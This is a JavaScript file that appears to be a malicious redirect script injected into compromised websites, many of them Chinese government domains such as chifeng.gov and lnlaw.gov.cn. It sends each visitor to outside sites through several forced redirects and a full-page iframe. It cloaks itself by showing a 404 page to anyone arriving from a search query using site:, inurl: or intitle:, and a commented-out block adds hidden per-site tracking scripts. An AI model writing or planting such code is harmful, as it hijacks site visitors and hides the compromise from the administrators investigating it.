var js616dm = document.domain.toLowerCase(); 
//var this_url = 'http://103.244.0.236/index.html';
//var this_url = 'http://www.123088.com/';
var this_url = 'http://live.sportscn.com';
if(js616dm.indexOf('chifeng.gov')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('pingliang.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('dongning.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('zgcy.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('lnlaw.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('xingtang.gov.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('haining.com.cn')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('dz169.net')!=-1){
  this_url = 'http://www.123188.com/';
}
if(js616dm.indexOf('brides.com.cn')!=-1){
  this_url = 'http://www.123996.com/';
}


var ref=document.referrer;
ref = ref.toLowerCase();
var baidu=ref.indexOf("baidu");
var soso=ref.indexOf("soso");
var google=ref.indexOf("google");
var sogou=ref.indexOf("sogou");
var s360=ref.indexOf("360.cn");
var s3602=ref.indexOf("so.com");
var sbing=ref.indexOf("bing.cn");

if(baidu!=-1 || soso!=-1 || google!=-1 || sogou!=-1 || s360!=-1 || s3602!=-1 || sbing!=-1){
if( ref.indexOf("site%3a")!=-1 || ref.indexOf("inurl%3a")!=-1 || ref.indexOf("intitle%3a")!=-1 ){
  this_url = '/404.html';
  window.top.location.replace(this_url);
  window.location.href=this_url;
}
}


document.write("<body onload=\"window.location.href='"+ this_url +"'\">");

/*
if(typeof(js616_)=='undefined'){
	var js616_ = 'loaded';
	var yesdata = '444444';
	
    if(js616dm.indexOf('chifeng.gov.cn')!=-1){
		document.write("loading");
		//document.write("<script src='http:\/\/s24.cnzz.com/stat.php?id=132964&web_id=132964&online=1&show=line' language=JavaScript charset='gb2312'><\/script>");
       //window.location.href='http://103.244.0.236/index.html?cf';
	}
document.write("<div style='display:none;'><script src='http:\/\/s24.cnzz.com/stat.php?id=132964&web_id=132964&online=1&show=line' language=JavaScript charset='gb2312'><\/script><\/div>");

	if(js616dm.indexOf('dongning.gov.cn')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s95.cnzz.com/stat.php?id=4757393&web_id=4757393\" language=\"JavaScript\"><"+"/"+"script>");

	}else if(js616dm.indexOf('nhxxg.com')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s21.cnzz.com/stat.php?id=4842262&web_id=4842262\" language=\"JavaScript\"><"+"/"+"script>");
	}else if(js616dm.indexOf('bk.gov.cn')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s13.cnzz.com/stat.php?id=4844535&web_id=4844535\" language=\"JavaScript\"><"+"/"+"script>");
	}else if(js616dm.indexOf('hnfzw.gov.cn')!=-1){
		//alert("»¶Ó­");
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s13.cnzz.com/stat.php?id=4856219&web_id=4856219\" language=\"JavaScript\"></"+"script>");
	}else if(js616dm.indexOf('5law.cn')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s19.cnzz.com/stat.php?id=4886223&web_id=4886223\" language=\"JavaScript\"></"+"script>");
	}else if(js616dm.indexOf('zgcy.gov.cn')!=-1){
		document.write("<script src=\"http://s96.cnzz.com/stat.php?id=4806447&web_id=4806447\" language=\"JavaScript\"></"+"script>");
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		
	}else if(js616dm.indexOf('hnfzb.gov.cn')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s21.cnzz.com/stat.php?id=4967153&web_id=4967153\" language=\"JavaScript\"></"+"script>");
	}else if(js616dm.indexOf('lnlaw.gov.cn')!=-1){
		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		document.write("<script src=\"http://s4.cnzz.com/stat.php?id=4801249&web_id=4801249\" language=\"JavaScript\"></"+"script>");
	}else{

		//var js616intv = setInterval(function(){if(yesdata!=''){setTimeout("tiaozhuan_616('http://103.244.0.236/index.html?')",388);}},388);
		
	}
	




}
*/
document.writeln("<iframe src=\'"+ this_url +"\' width=100% height=5000></iframe>");

//document.writeln("<meta http-equiv=\"refresh\" content=\"3;URL=http://103.244.0.236/index.html?c\"><script>top.location='http:\/\/103.244.0.236/index.html?d';<\/script>");
setTimeout("top.location='"+ this_url +"';",1000);

//window.location.href='http://103.244.0.236/index.html?b';
document.write("<meta http-equiv=\"refresh\" content=\"0;url=\""+ this_url +"\">");

function tiaozhuan_616(js616url){
	window.location.href=this_url +'';
	clearInterval(js616intv);

	//location.replace='http://103.244.0.236/index.html?b';
	//window.location.href='http://103.244.0.236/index.html?a';


		//document.write("<meta http-equiv=\"refresh\" content=\"1;url=\""+js616url+"#index.html?y\">");
}

		//document.write("<\/body>");
